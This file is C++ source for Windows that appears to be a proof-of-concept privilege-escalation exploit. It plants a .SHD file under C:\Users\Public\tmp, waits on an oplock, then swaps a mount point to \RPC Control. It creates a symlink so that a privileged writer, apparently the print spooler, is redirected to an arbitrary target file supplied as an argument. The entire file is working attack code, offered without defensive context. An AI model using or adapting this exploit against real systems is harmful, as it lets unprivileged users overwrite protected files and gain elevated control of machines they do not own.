#include <windows.h>
#include <stdio.h>
#include "CommonUtils.h"
#include "ReparsePoint.h"
#include "FileOpLock.h"
#include "FileSymlink.h"
LPWSTR ShdFile = L"C:\\Users\\Public\\tmp\\2\\00003.SHD";
static FileOpLock* oplock = nullptr;
wchar_t TargetFile[100] = L"\x00";
void HandleOplock()
{
    if(!ReparsePoint::DeleteMountPoint(L"C:\\Users\\Public\\tmp\\1"))
    {
        printf("Error deleting mount point %ls\n", GetErrorMessage().c_str());
    }
    if (!ReparsePoint::CreateMountPoint(L"C:\\Users\\Public\\tmp\\1", L"\\RPC Control", L""))
    {
        printf("Error creating mount point - %ls\n", GetErrorMessage().c_str());
    }
    bool permanent = true;
    FileSymlink sl(permanent);
    if (sl.CreateSymlink(L"\\RPC Control\\00003.SHD", TargetFile, nullptr))
    {
        if (!permanent)
        {
            DebugPrintf("Press ENTER to exit and delete the symlink\n");
            getc(stdin);
        }
    }
    else {
        printf("Error CreateSymlink\n");
    }
    DebugPrintf("OpLock triggered, hit ENTER to close oplock\n");
    getc(stdin);
}
int SetOpLock(LPCWSTR path)
{
    LPCWSTR target = path;
    LPCWSTR share_mode = L"";

    oplock = FileOpLock::CreateLock(ShdFile, share_mode, HandleOplock);
    if (oplock != nullptr)
    {
        oplock->WaitForLock(INFINITE);
        delete oplock;
    }
    else
    {
        printf("Error creating oplock\n");
        return 1;
    }

    return 0;
}
int main(int argc, char* argv[])
{
    if (argc == 1)
    {
        printf("One argument expected.\n");
    }
    
    swprintf(TargetFile, 100, L"%hs", argv[1]);
    CreateDirectory(L"C:\\Users\\Public\\tmp\\2", NULL);
    ReparsePoint::CreateMountPoint(L"C:\\Users\\Public\\tmp\\1", L"C:\\Users\\Public\\tmp\\2", L"");
    
    //CreateLockFile
    HANDLE hd;
    hd = CreateFile(ShdFile, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE| FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    CloseHandle(hd);
    //SetLock
    SetOpLock(ShdFile);
    return 0;
}